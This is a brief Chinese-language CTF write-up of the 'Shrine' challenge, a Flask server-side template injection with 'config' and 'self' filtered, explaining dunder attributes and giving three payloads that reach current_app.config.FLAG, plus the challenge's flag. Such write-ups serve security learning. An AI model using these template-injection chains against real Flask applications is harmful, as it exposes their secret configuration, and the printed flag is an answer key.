# Shrine

> flask ssti注入,比起第19题多了一些过滤函数

## 相关函数

> url_for
> 根据参数构造url

> get_flashed_messages
> 返回之前在Flask中通过 flash() 传入的信息列表

## 思路分析

> \_\_class\_\_  返回类型所属的对象
> \_\_mro\_\_    返回一个包含对象所继承的基类元组,方法在解析时按照元组的顺序解析
> \_\_base\_\_   返回该对象所继承的基类
> \_\_base\_\_和\_\_mro\_\_    都是用来寻找基类的
> \_\_subclasses\_\_   每个新类都保留了子类的引用,这个方法返回一个类中仍然可用的的引用的列表
> \_\_init\_\_  类的初始化方法
> \_\_globals\_\_  对包含函数全局变量的字典的引用

> flask ssti注入,比起第19题多了一些过滤函数,从原代码中可看到过滤了config和self,flag信息是直接保存到了app.config信息中,如果没有过滤,直接{{config}}就能获取到flag,有了过滤后就得换种思路,可以通过全局变量实现沙盒逃逸

## payload

> {{url_for.\_\_globals\_\_['current_app'].config.FLAG}}

> {{get_flashed_messages.\_\_globals\_\_['current_app'].config.FLAG}}

> {{request.application.\_\_self\_\_._get_data_for_json.\_\_globals\_\_['json'].JSONEncoder.default.\_\_globals\_\_['current_app'].config['FLAG']}}

## flag

> flag{shrine_is_good_ssti}

## 参考

> https://zhuanlan.zhihu.com/p/93746437
> https://www.cnblogs.com/xx5xx/p/16087449.html